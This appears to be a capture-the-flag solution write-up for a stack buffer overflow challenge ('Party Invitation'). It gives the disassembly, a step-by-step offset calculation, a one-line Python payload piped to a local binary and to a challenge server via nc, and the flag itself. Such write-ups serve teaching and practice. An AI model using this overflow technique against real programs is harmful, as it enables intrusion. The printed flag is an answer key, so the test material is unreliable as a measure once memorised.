# Party Invitation

## Question Text
There's an awesome party that's going to go down next week. Gotta get the invitation!

*Created - Noans*

## Distribution
- AwesomeParty 
	- SHA1: `a31ecb2e11a5b6762f78244f5103b424b0080b72`
	- Compiled from `generate.c` in generate folder using `cc generate.c -fno-stack-protector -Wl,--section-start=.special=0x1a1b1c1d`

## Solution
1. You would need to do an objdump on `AwesomeParty` with the command `objdump -d AwesomeParty`.
2. The following parts of from the `objdump` should be studied:  
```
00000000004005c6 <check>:
  4005c6:	55                   	push   %rbp
  4005c7:	48 89 e5             	mov    %rsp,%rbp
  4005ca:	48 83 ec 20          	sub    $0x20,%rsp
  4005ce:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  4005d2:	48 89 c6             	mov    %rax,%rsi
  4005d5:	bf 0c 07 40 00       	mov    $0x40070c,%edi
  4005da:	b8 00 00 00 00       	mov    $0x0,%eax
  4005df:	e8 cc fe ff ff       	callq  4004b0 <__isoc99_scanf@plt>
  4005e4:	bf 0f 07 40 00       	mov    $0x40070f,%edi
  4005e9:	e8 a2 fe ff ff       	callq  400490 <puts@plt>
  4005ee:	90                   	nop
  4005ef:	c9                   	leaveq 
  4005f0:	c3                   	retq
```
```
Disassembly of section .special:

000000001a1b1c1d <invitation>:
    1a1b1c1d:	55                   	push   %rbp
    1a1b1c1e:	48 89 e5             	mov    %rsp,%rbp
    1a1b1c21:	bf 98 06 40 00       	mov    $0x400698,%edi
    1a1b1c26:	e8 65 e8 24 e6       	callq  400490 <puts@plt>
    1a1b1c2b:	bf c0 06 40 00       	mov    $0x4006c0,%edi
    1a1b1c30:	e8 5b e8 24 e6       	callq  400490 <puts@plt>
    1a1b1c35:	90                   	nop
    1a1b1c36:	5d                   	pop    %rbp
    1a1b1c37:	c3                   	retq  
```
3. The third line of the disassembly of the check function tells us 32 bytes is reserved for a variable.
4. You would also need to understand that the next 8 bytes is the `%rbp` of the check function.
5. Therefore, realize that one needs to write 40 bytes of garbage first to be able to overwrite the return address of the check function.
6. Also derive address of `awesome` function is `1a1b1c1d`.

Final command to exploit local program assuming machine uses little-endian:  
`python -c 'print "a" * 40 + "\x1d\x1c\x1b\x1a"' | ./AwesomeParty`

In order to get the flag, players have to pipe the output to the game server:  
`python -c 'print "a" * 40 + "\x1d\x1c\x1b\x1a"' | nc pwn.chal.gryphonctf.com 18153`

### Flag
`GCTF{4W3S0M3_L177L3_P4R7Y}`

## Recommended Reads
* https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
* https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64